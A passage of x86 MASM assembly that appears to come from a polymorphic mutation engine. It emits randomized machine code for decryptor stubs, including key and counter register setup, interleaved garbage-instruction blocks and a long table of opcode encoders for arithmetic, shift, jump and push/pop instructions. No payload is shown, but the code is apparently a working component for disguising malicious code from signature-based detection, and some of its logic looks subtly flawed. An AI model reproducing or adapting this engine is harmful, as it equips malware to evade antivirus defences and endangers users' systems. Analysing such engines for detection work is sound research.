        CALL   GEN_POP_REG32
        Call   Make_Random_Blk;**
        mov    cl,byte ptr [ebp + counter_reg]
        Call   RestConst  
        Call   Make_Random_Blk;**        
        ret
       
    @PC_SIZE_MOV:
        ;****
        CALL   GEN_MOV_REG32_IMM
        Call   Make_Random_Blk;**
        mov    cl,byte ptr [ebp + counter_reg]
        Call   RestConst  
        Call   Make_Random_Blk;**        
        ret
        
    @PC_SIZE_LEA:
      mov    byte ptr [ebp + _REG_OPCODE], cl;-***-
      mov    byte ptr [ebp + _MOD], 0
      mov    byte ptr [ebp + _RM], 5
      mov    dword ptr [ebp + Displacement], ebx
        CALL   GEN_LEA_REG32_DISP32
        Call   Make_Random_Blk;**
        mov    cl,byte ptr [ebp + counter_reg]
        Call   RestConst  
        Call   Make_Random_Blk;**
        ret
;=========  =========  =========  =========  [KEY] =========  =========  =========  =========
@@PC_SEQKEY:


        
     
        xor    eax,eax
        push   3
        pop    ecx
        Call   Get_rand_range 
  
        or     eax,eax
        jz     @PC_KEY_MOV

        or     eax,eax
        jz     @PC_KEY_LEA
               
    @PC_KEY_PUSHPOP:
        CAll   Random32
        mov    ebx,eax
        CALL   GEN_PUSH_IMM32
      
   
        Call   Make_Random_Blk;**    
        mov    cl,byte ptr [ebp + key_reg]
        CALL   GEN_POP_REG32
        Call   Make_Random_Blk;**
        jmp    @PC_KEY_NEXT
        
    @PC_KEY_MOV:
        ;**
        Call   Random32
        mov    ebx,eax
        mov    cl,byte ptr [ebp + key_reg]
        CALL   GEN_MOV_REG32_IMM
        Call   Make_Random_Blk;**
        jmp    @PC_KEY_NEXT

    @PC_KEY_LEA:

        Call   Random32
        mov    ebx,eax
        
        mov    cl,byte ptr [ebp + key_reg]
      mov    byte ptr [ebp + _REG_OPCODE], cl;-***-
      mov    byte ptr [ebp + _MOD], 0
      mov    byte ptr [ebp + _RM], 5
      mov    dword ptr [ebp + Displacement], ebx
        CALL   GEN_LEA_REG32_DISP32
        Call   Make_Random_Blk;**
  @PC_KEY_NEXT:  

        Call   CallWaitLoop?;**
        ret   

    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; OPCODE GENERATION ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_16BITS_OPC_TBL         dd OFFSET GEN_ADD_REG16_IMM 
                        dd OFFSET GEN_XOR_REG16_IMM
                        dd OFFSET GEN_SUB_REG16_IMM 
                        dd OFFSET GEN_ADD_REG16_REG16             ; 1
                        dd OFFSET GEN_XOR_REG16_REG16
                        dd OFFSET GEN_SUB_REG16_REG16
         
_16BITS_OPC_NBR         = 5

GEN_16BITS_OPC proc uses edx ecx


        
        push   ecx
        
        xor    eax,eax
        push   _16BITS_OPC_NBR                             
        pop    ecx
        Call   Get_rand_range  
        
        pop    ecx

        lea    edx, dword ptr [ebp + _16BITS_OPC_TBL]
        mov    edx, dword ptr [edx + (eax * 4)]
        add    edx, ebp  
 

        Call   edx
        ret
GEN_16BITS_OPC endp

GEN_ADD_REG32_IMM:

        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0C083h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,05h                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_ADD_REG32_IMM
       @@:
        mov    ax,0C081h
        add     ah,cl
        stosw

      End_ADD_REG32_IMM:
        mov    eax,ebx
        stosd
        ret

GEN_ADD_REG16_IMM:
        mov    al,66h                      ; Prefix
        stosb
        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0C083h 
        add     ah,cl
        stosw
        mov    al,bl
       stosb
        ret       
       @@:

        or     cl,cl
        jnz    @F
        mov    al,05h                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_ADD_REG16_IMM
       @@:
       
        mov    ax,0C081h
        add     ah,cl
        stosw
      End_ADD_REG16_IMM:
        mov    ax,bx
        stosw
        ret

GEN_ADD_REG8_IMM:


        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:

        or      cl,cl
        jz      @F
                
        mov    ax,0C080h 
        add    ah,cl
        stosw
        mov    al,bl
        stosb
        ret

       @@:
        mov    al,04h
        stosb
        mov    al,bl
        stosb
        ret
            
GEN_ADD_REG32_REG32:
        mov    al,03h                      ; ADD REG32,REG32
        mov    ah,cl                       ; REGISTER1
        shl    ah,3                        ; ah * 8
        or     ah,ch                       ; REGISTER2
        or     ah,0C0h
        stosw
        ret

GEN_ADD_REG16_REG16:
        mov    al,66h                      ; Prefix
        stosb
        mov    ax,0C003h
        shl    cl,3
        or     ah,cl
        or     ah,ch       
        stosw
        ret

GEN_ADD_REG8_REG8:

        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:
       
        mov    ax,0C002h
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw        
        ret   

                                 
GEN_MOV_REG32_IMM:     
        mov    al,0B8h                      ; MOV REG32,IMM
        or    al,cl                        ; REGISTER
        stosb

        mov    eax,ebx                      ; IMMEDIATE
        stosd

        ret


;GEN_MOV_REG32_MEM:                              ; mov REG32, MEM  

;GEN_MOV_REG32_MEM_REG32_plus_REG32:             ; MOV REG32,DWORD PTR [REG32+REG32]


                               
GEN_MOV_REG32_MEM_REG32:     
        cmp    ch,5
        jz     @F
        mov    al,08Bh                     ; MOV REG32,dwo [REG32]
        mov    ah,cl                       ; REGISTER1
        shl    ah,3                        ; ah * 8
        or     ah,ch                       ; REGISTER2
        stosw
        ret
       @@:
        mov    ax,458Bh
        shl    cl,3
        or     ah,cl
        stosw
        xor    al,al
        stosb    
        ret

GEN_MOV_MEM_REG32_REG32:  
        cmp    ch,5
        jz     @F   
        mov    al,089h                     ; MOV dwo [REG32], REG32
        mov    ah,cl                       ; REGISTER1
        shl    ah,3                        ; ah * 8
        or     ah,ch                       ; REGISTER2
        stosw
        ret
       @@:
        mov    ax,4589h
        shl    cl,3
        or     ah,cl
        stosw
        xor    al,al
        stosb    
        ret
      
GEN_MOV_REG32_REG32 proc   
       
        cmp    cl, ch                      ; Anti-Absurd Code prevents "mov samereg, samereg"
        jnz    Skip
       @@:
        call   Random32
        and    al, 7
        cmp    al, cl
        jz     @B
        mov    ch, al
       Skip:  
      
        mov    al,08Bh                     ; MOV REG32,REG32
        mov    ah,cl                       ; REGISTER1
        shl    ah,3                        ; ah * 8
        or     ah,ch                       ; REGISTER2
        or     ah,0C0h
        stosw
        ret
        
GEN_MOV_REG32_REG32 endp
  
GEN_XOR_REG32_REG32:
        mov    al,033h                     ; MOV REG32,REG32
        mov    ah,cl                       ; REGISTER1
        shl    ah,3                        ; ah * 8
        or     ah,ch                       ; REGISTER2
        or     ah,0C0h
        stosw

        ret

GEN_XOR_REG16_REG16:
        mov    al,66h
        stosb
        Call   GEN_XOR_REG32_REG32
        ret

GEN_XOR_REG8_REG8:
        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:
       
        mov    ax,0C032h
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw
        ret

                         
GEN_XOR_REG32_IMM: 


        
        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0F083h
        add    ah,cl
        stosw
        mov    al,bl
        stosb
        ret
        @@:

        or     cl,cl
        jnz    @F
        mov    al,35h                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_XOR_REG32_IMM
       @@:   
        
        mov    ax,0F081h
        add    ah,cl 
        stosw
        
       End_XOR_REG32_IMM:
        mov    eax,ebx
        stosd               
        ret

GEN_XOR_REG16_IMM:
        mov    al,66h
        stosb
        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0F083h
        add    ah,cl
        stosw
        mov    al,bl
        stosb
        ret
       @@:

        or     cl,cl
        jnz    @F
        mov    al,35h                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_XOR_REG16_IMM
       @@:   
       
        mov    ax,0F081h
        or     ah,cl
        stosw
        
       End_XOR_REG16_IMM:
        mov    ax,bx
        stosw
        ret

GEN_XOR_REG8_IMM:
        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:

        or     cl,cl
        jz     @F
        
        mov    ax,0F080h
        add    ah,cl
        stosw
        mov    al,bl
        stosb
        ret
        
       @@:
        mov    al,34h
        stosb
        mov    al,bl
        stosb
        ret       
                       
GEN_MOV_REG32_MEM_INDEX:     
        mov    ax,428Bh                     ; MOV REG32,dwo [REG+INDEX]
        or     ah,cl                        ; REGISTER
        stosw
        CAll   IS_NBR_8B
        jc     @F
        mov    al,bl
        stosb
        ret
        @@:
        mov    eax,ebx                      ; MEM
        stosd

        ret


GEN_PUSH_IMM32:
        CALL   IS_NBR_8B
        Jc     @F
        Call   GEN_PUSH_IMM8
        ret
       @@:
        mov    al,68h                           ; PUSH IMM32
        stosb
        mov    eax,ebx
        stosd
        
        ret


            
GEN_PUSH_MEM32:
        mov    ax,35FFh                           ; PUSH MEM32
        stosw
        mov    eax,ebx
        stosd
        
        ret

GEN_PUSH_REG32:
        mov    al,50h                            ; PUSH  REG32
        add    al,cl        
        stosb
        
        ret
        
                     
GEN_PUSH_REGMEM32:
        cmp    cl,5
        jz     @F
        
        mov    ax,30FFh                           ; PUSH  dwo [REG32]
        or     ah,cl        
        stosw
        ret
       @@:
        mov    ax,75FFh
        stosw
        xor    al,al
        stosb
        ret
        
GEN_PUSH_REGMEM32_INDEX8:
        mov    ax,70FFh                           ; PUSH  dwo [REG32+INDEX]
        or     ah,cl
        
        stosw
        mov    al,bl
        stosb
        
        ret


GEN_PUSH_IMM8:
        mov    al,6Ah                           ; PUSH IMM8
        stosb
        mov    al,bl
        stosb        
        ret
        
GEN_POP_REG32:
        mov    al,58h
        add    al,cl
        stosb
        ret

GEN_POP_REGMEM32:
        cmp    cl,5
        jz     @F
        mov    ax,008Fh
        add    ah,cl
        stosw
        ret
       @@:
        mov    ax,458Fh
        stosw
        xor    al,al
        stosb
        ret

GEN_LEA_REG32_DISP32:
        mov   al, 8Dh
        stosb
        Call   EncodeModRM_SIB 
        ret    
         
;GEN_LEA_REG32_DISP32:
;        mov    ax,058Dh
;        shl    cl,3                             ; cl * 4
;        or     ah,cl
;        stosw
;        mov    eax,ebx
;        stosd
;        ret


GEN_DEC_REG32:                                  ; Dec
        mov    al,48h
        add    al,cl
        stosb
        ret
        
GEN_INC_REG32:                                  ; Inc
        mov    al,40h
        add    al,cl
        stosb
        ret
        
    

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

GEN_SUB_REG32_REG32:                       ; SUB REG32,REG32
        mov    ax,0C02Bh
        shl    cl,3
        or     ah,cl
        or     ah,ch
        shr    cl,3
        stosw
        ret
        
GEN_SUB_REG16_REG16:
        mov    al,66h
        stosb
        mov    ax,0C02Bh
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw
        ret  
              
GEN_SUB_REG8_REG8:

        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:

        mov    ax,0C02Ah
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw
        ret         

     
GEN_SUB_REG32_IMM:                         ; SUB REG32,IMM

        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0E883h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,2Dh                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_SUB_REG32_IMM
        @@:
        
        mov    ax,0E881h
        add     ah,cl
        stosw

      End_SUB_REG32_IMM:
        mov    eax,ebx
        stosd
        ret

GEN_SUB_REG16_IMM:
        mov    al,66h
        stosb        
        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0E883h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,2Dh                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_SUB_REG16_IMM
        @@:
        
        mov    ax,0E881h
        add    ah,cl
        stosw

      End_SUB_REG16_IMM:
        mov    ax,bx
        stosw
        ret

GEN_SUB_REG8_IMM:

        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:

        or     cl,cl
        jz     @F
        
        mov    ax,0E880h
        add    ah,cl
        stosw
        mov    al,bl
        stosb
        ret
       @@:
        mov    al,2ch
        stosb
        mov    al,bl
        stosb
        ret
        
GEN_DEC_REG8:
        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:
        mov     ax,0C8FEh
        or      ah,cl
        stosw
        ret

GEN_INC_REG8:
        Call    GetValid8BREGS;-*
        jnc     @F
        ret
       @@:
        mov     ax,0C0FEh
        or      ah,cl
        stosw
        ret       
GEN_ROL_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:

        .IF    bl == 1
            mov    ax,0C0D1h                   ; MOV REG32,REG32
            or    ah,cl                       ; REGISTER1
            stosw
            ret
        .ENDIF

        mov    ax,0C0C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret

GEN_ROR_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        .IF    bl == 1
            mov    ax,0C8D1h                   ; MOV REG32,REG32
            or     ah,cl                       ; REGISTER1
            stosw
            ret
        .ENDIF

        mov    ax,0C8C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret



GEN_JNZ_OFS:

        CALL   IS_NBR_8B
        jnc    @JNZ_SHORT
        sub    ebx,6
        mov    ax,850fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JNZ_SHORT:
        dec    ebx
        dec    ebx
        mov    al,75h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

GEN_JZ_OFS:

        CALL   IS_NBR_8B
        jnc    @JZ_SHORT
        sub    ebx,6
        mov    ax,840fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JZ_SHORT:
        dec    ebx
        dec    ebx
        mov    al,74h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

   
GEN_JNS_OFS:

        CALL   IS_NBR_8B
        jnc    @JNS_SHORT
        sub    ebx,6
        mov    ax,890fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JNS_SHORT:
        dec    ebx
        dec    ebx
        mov    al,79h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

GEN_JS_OFS:

        CALL   IS_NBR_8B
        jnc    @JS_SHORT
        sub    ebx,6
        mov    ax,880fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JS_SHORT:
        dec    ebx
        dec    ebx
        mov    al,78h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

GEN_JG_OFS:

        CALL   IS_NBR_8B
        jnc    @JG_SHORT
        sub    ebx,6
        mov    ax,8F0fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JG_SHORT:
        dec    ebx
        dec    ebx
        mov    al,7Fh
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

GEN_JL_OFS:

        CALL   IS_NBR_8B
        jnc    @JL_SHORT
        sub    ebx,6
        mov    ax,8C0fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JL_SHORT:
        dec    ebx
        dec    ebx
        mov    al,7Ch
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret


GEN_JGE_OFS:

        CALL   IS_NBR_8B
        jnc    @JGE_SHORT
        sub    ebx,6
        mov    ax,8D0fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JGE_SHORT:
        dec    ebx
        dec    ebx
        mov    al,7Dh
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

GEN_JLE_OFS:

        CALL   IS_NBR_8B
        jnc    @JLE_SHORT
        sub    ebx,6
        mov    ax,8E0fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JLE_SHORT:
        dec    ebx
        dec    ebx
        mov    al,7Eh
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret


GEN_JBE_OFS:

        CALL   IS_NBR_8B
        jnc    @JBE_SHORT
        sub    ebx,6
        mov    ax,860fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JBE_SHORT:
        dec    ebx
        dec    ebx
        mov    al,76h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret

GEN_JA_OFS:

        CALL   IS_NBR_8B
        jnc    @JA_SHORT
        sub    ebx,6
        mov    ax,870fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JA_SHORT:
        dec    ebx
        dec    ebx
        mov    al,77h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret
        

GEN_JNB_OFS:

        CALL   IS_NBR_8B
        jnc    @JNB_SHORT
        sub    ebx,6
        mov    ax,830fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JNB_SHORT:
        dec    ebx
        dec    ebx
        mov    al,73h
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret   

GEN_JP_OFS:

        CALL   IS_NBR_8B
        jnc    @JP_SHORT
        sub    ebx,6
        mov    ax,8A0fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JP_SHORT:
        dec    ebx
        dec    ebx
        mov    al,7Ah
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret 

GEN_JNP_OFS:

        CALL   IS_NBR_8B
        jnc    @JNP_SHORT
        sub    ebx,6
        mov    ax,8B0fh
        stosw
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JNP_SHORT:
        dec    ebx
        dec    ebx
        mov    al,7Bh
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret 

GEN_JMP_OFS:

        CALL   IS_NBR_8B
        jnc    @JMP_SHORT
        sub    ebx,5
        mov    al,0E9h
        stosb
        mov    byte ptr [ebp + JmpShort?], 0
        mov    eax,ebx
        stosd
        ret
        
     @JMP_SHORT:
        dec    ebx
        dec    ebx
        mov    al,0EBh
        stosb
        mov    byte ptr [ebp + JmpShort?], 1
        mov    al,bl
        stosb
        ret 

GEN_CALL_OFS:
        mov    al,0E8h
        stosb
        sub    ebx,5
        mov    eax,ebx
        stosd
        ret
        
GEN_RET:
        mov    al,0C3h
        stosb
        ret
        
GEN_RETN_IMM16:
        mov    al,0C2h
        stosb
        mov    ax,bx
        stosw
        ret
        
GEN_CMP_REG32_IMM:

        CALL   IS_NBR_8B
        jc    @CMP_REG32_IMM32

        mov    ax,0F883h
        or     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @CMP_REG32_IMM32:
        or     cl,cl
        jnz    @F
        mov    al,3Dh                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_CMP_REG32_IMM
        @@:
        mov    ax,0F881h
        or     ah,cl
        stosw
      End_CMP_REG32_IMM:            
        mov    eax,ebx
        stosd
        ret

GEN_CMP_REG32_REG32:
        mov    ax, 0C03Bh
        or     ah, cl
        shl    ch, 3
        or     ah, ch
        shr    ch, 3
        stosw
        ret
        
GEN_TEST_REG32_REG32:                       ; SUB REG32,REG32
        mov    ax,0C085h
        shl    ch,3
        or     ah,cl
        or     ah,ch
        shr    cl,3
        stosw
        ret

GEN_TEST_REG32_IMM32 proc
        or     cl, cl
        jnz    @F
        mov    al, 0A9h
        stosb
        jmp    skip
       @@:
        mov    ax, 0C0F7h
        or     ah, cl
        stosw
       skip:
        mov    eax, ebx
        stosd
        ret
GEN_TEST_REG32_IMM32 endp
   
IS_NBR_8B:
        
        .IF   ebx >= 80h && ebx < -80h
            stc                             ; Number is 32 bits
            ret
        .ENDIF
        clc                                 ; Number is 8 bits
        ret  

GEN_SHR_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        .IF    bl == 1
            mov    ax,0E8D1h                   ; SHR REG32,IMM8
            or     ah,cl                       
            stosw
            ret
        .ENDIF

        mov    ax,0E8C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret

GEN_SHL_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        .IF    bl == 1
            mov    ax,0E0D1h                   ; SHl REG32,IMM8
            or     ah,cl                       
            stosw
            ret
        .ENDIF

        mov    ax,0E0C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret

GEN_SAR_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        .IF    bl == 1
            mov    ax,0F8D1h                   ; SHl REG32,IMM8
            or     ah,cl                       
            stosw
            ret
        .ENDIF

        mov    ax,0F8C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret
        
GEN_SHLD_REG32_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        mov    al,0Fh
        stosb
        mov    ax,0C0A4h
        shl    ch,3
        or     ah,cl
        or     ah,ch
        stosw     
        mov    al,bl
        stosb
        ret
        

        
GEN_SHRD_REG32_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        mov    al,0Fh
        stosb
        mov    ax,0C0ACh
        shl    ch,3
        or     ah,cl
        or     ah,ch
        stosw     
        mov    al,bl
        stosb
        ret

GEN_SHLD_REG32_REG32_CL:
      
        mov    al,0Fh
        stosb
        mov    ax,0C0A5h
        shl    ch,3
        or     ah,cl
        or     ah,ch
        stosw     
        ret

GEN_SHRD_REG32_REG32_CL:
      
        mov    al,0Fh
        stosb
        mov    ax,0C0ADh
        shl    ch,3
        or     ah,cl
        or     ah,ch
        stosw     
        ret

GEN_SAR_REG32_CL:
      

        mov    ax,0F8D3h
        or     ah,cl
        stosw     
        ret

GEN_SHL_REG32_CL:
      

        mov    ax,0E0D3h
        or     ah,cl
        stosw     
        ret

GEN_SHR_REG32_CL:
      

        mov    ax,0E8D3h
        or     ah,cl
        stosw     
        ret    

GEN_RCL_REG32_CL:
      

        mov    ax,0D0D3h
        or     ah,cl
        stosw     
        ret    
        
GEN_RCR_REG32_CL:
      

        mov    ax,0D8D3h
        or     ah,cl
        stosw     
        ret   

GEN_ROL_REG32_CL:
      

        mov    ax,0C0D3h
        or     ah,cl
        stosw     
        ret   

GEN_ROR_REG32_CL:
      

        mov    ax,0C8D3h
        or     ah,cl
        stosw     
        ret  
                   
GEN_IMUL_REG32:
        mov    ax,0E8F7h
        or     ah,cl
        stosw
        ret

GEN_MUL_REG32:
        mov    ax,0E0F7h
        or     ah,cl
        stosw
        ret
        
GEN_IMUL_REG32_REG32_IMM:

        CAll   IS_NBR_8B
        jc     @F
        mov    ax,0C06Bh
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw
        mov    al,bl
        stosb
        ret
      @@:
        mov    ax,0C069h
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw
        mov    eax,ebx
        stosd
          
        ret

GEN_IMUL_REG32_REG32:
        mov    al,0Fh
        stosb
        mov    ax,0C0AFh
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw     
        ret

GEN_DIV_REG32:
        CMP   cl,2
        jz    @F
        CMP   byte ptr [ebp + garb_reg1],2
        jz    @F
        CMP   byte ptr [ebp + garb_reg2],2
        jz    @F   
        CMP   byte ptr [ebp + garb_reg3],2
        jz    @F  
        ret

       @@:
        mov   ax,0D233h
        stosw
        mov   ax,0F0F7h
        or    ah,cl
        stosw
        ret
        
GEN_IDIV_REG32:
        CMP   cl,2
        jz    @F
        CMP   byte ptr [ebp + garb_reg1],2
        jz    @F
        CMP   byte ptr [ebp + garb_reg2],2
        jz    @F   
        CMP   byte ptr [ebp + garb_reg3],2
        jz    @F  
        ret
            
       @@:
        mov   ax,0D233h
        stosw
        mov   ax,0F8F7h
        or    ah,cl
        stosw
        ret
        
GEN_XADD_REG32_REG32:
        mov    al,0Fh
        stosb
        mov    ax,0C0C1h
        shl     ch,3
        or      ah,cl
        or      ah,ch 
        stosw       
        ret
           
GEN_ADC_REG32_REG32:
        mov     ax,0C011h
        shl     ch,3
        or      ah,cl
        or      ah,ch
        stosw
        ret
        
GEN_ADC_REG32_IMM32:
       CAll   IS_NBR_8B
        jc     @F
        mov    ax,0D083h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,15h                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_ADC_REG32_IMM32
        @@:
        
        mov    ax,0D081h
        add     ah,cl
        stosw

      End_ADC_REG32_IMM32:
        mov    eax,ebx
        stosd
        ret
     
GEN_SBB_REG32_REG32:
        mov     ax,0C01Bh
        shl     cl,3
        or      ah,cl
        or      ah,ch
        stosw
        ret

GEN_SBB_REG32_IMM32:
       CAll   IS_NBR_8B
        jc     @F
        mov    ax,0D883h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,1Dh                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_SBB_REG32_IMM32
        @@:
        
        mov    ax,0D881h
        add     ah,cl
        stosw

      End_SBB_REG32_IMM32:
        mov    eax,ebx
        stosd
        ret
        
GEN_OR_REG32_REG32:
        mov     ax,0C009h
        shl     ch,3
        or      ah,cl
        or      ah,ch
        stosw
        ret

GEN_OR_REG32_IMM32:
       CAll   IS_NBR_8B
        jc     @F
        mov    ax,0C883h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,0Dh                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_GEN_OR_REG32_IMM32
        @@:
        
        mov    ax,0C881h
        add     ah,cl
        stosw

      End_GEN_OR_REG32_IMM32:
        mov    eax,ebx
        stosd
        ret
        
GEN_AND_REG32_REG32:
        mov     ax,0C021h
        shl     ch,3
        or      ah,cl
        or      ah,ch
        stosw
        ret      

GEN_AND_REG32_IMM32:
       CAll   IS_NBR_8B
        jc     @F
        mov    ax,0E083h
        add     ah,cl
        stosw
        mov    al,bl
        stosb
        ret
      @@:

        or     cl,cl
        jnz    @F
        mov    al,25h                      ; EAX SPECIFIC OPCODE
        stosb
        jmp    End_AND_REG32_IMM32
        @@:
        
        mov    ax,0E081h
        add     ah,cl
        stosw

      End_AND_REG32_IMM32:
        mov    eax,ebx
        stosd
        ret

GEN_MOVSX_REG32_REG8:
        mov     al,0Fh
        stosb
        mov     ax,0C0BEh
        shl     cl,3
        or      ah,cl
        push    eax
        CALL    Random32
        and     eax,7
        mov     ch,al
        pop     eax
        or      ah,ch
        stosw
        ret

GEN_MOVZX_REG32_REG8:
        mov     al,0Fh
        stosb
        mov     ax,0C0B6h
        shl     cl,3
        or      ah,cl
        push    eax
        CALL    Random32
        and     eax,7
        mov     ch,al
        pop     eax
        or      ah,ch
        stosw
        ret

GEN_BSWAP_REG32:
        mov     ax,0C80Fh
        or      ah,cl
        stosw
        ret

GEN_NEG_REG32:
        mov     ax,0D8F7h
        or      ah,cl
        stosw
        ret
        
GEN_NOT_REG32:
        mov     ax,0D0F7h
        or      ah,cl
        stosw
        ret    

GEN_ONEBYTE:
        xor    eax,eax
        push   5
        pop    ecx
        Call   Get_rand_range
        or     eax,eax
        jz     GEN_CLD
        dec    eax
        jz     GEN_NOP
        dec    eax
        jz     GEN_CMC
        dec    eax
        jz     GEN_STC
        dec    eax
        jz     GEN_CLC
                
        mov    al,0FDh
        stosb  
        ret   
          
       GEN_CLD:  
        mov    al,0FCh
        stosb  
        ret   
          
       GEN_NOP: 
        mov    al,90h
        stosb
        ret

       GEN_CMC:
        mov    al,0F5h
        stosb
        ret
        
       GEN_STC:
        mov    al,0F9h
        stosb
        ret    

       GEN_CLC:
        mov    al,0F8h
        stosb
        ret   
         
GEN_XCHG_REG32_REG32:
        or     cl,cl
        jnz    @F
        cmp    cl,ch
        jnz    @F
        ret                 ;This makes a nop
       @@:
        or     ch,ch
        jnz    XCHG_2
       
        mov    al,90h
        or     al,cl
        or     al,ch
        stosb
        ret
       XCHG_2:
        mov    ax,0C087h
        shl    cl,3
        or     ah,cl
        or     ah,ch
        stosw
        ret

        
       



GEN_RCL_REG32_IMM8:

        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        .IF    bl == 1
            mov    ax,0D0D1h                   
            or    ah,cl                       
            stosw
            ret
        .ENDIF

        mov    ax,0D0C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret

GEN_RCR_REG32_IMM8:
        and    ebx,0Fh

       or     ebx,ebx
       jnz    @F
       inc    ebx
      @@:
      
        .IF    bl == 1
            mov    ax,0D8D1h                   
            or     ah,cl                       
            stosw
            ret
        .ENDIF

        mov    ax,0D8C1h
        or     ah,cl 
        stosw  
        mov    al,bl
        stosb
        ret
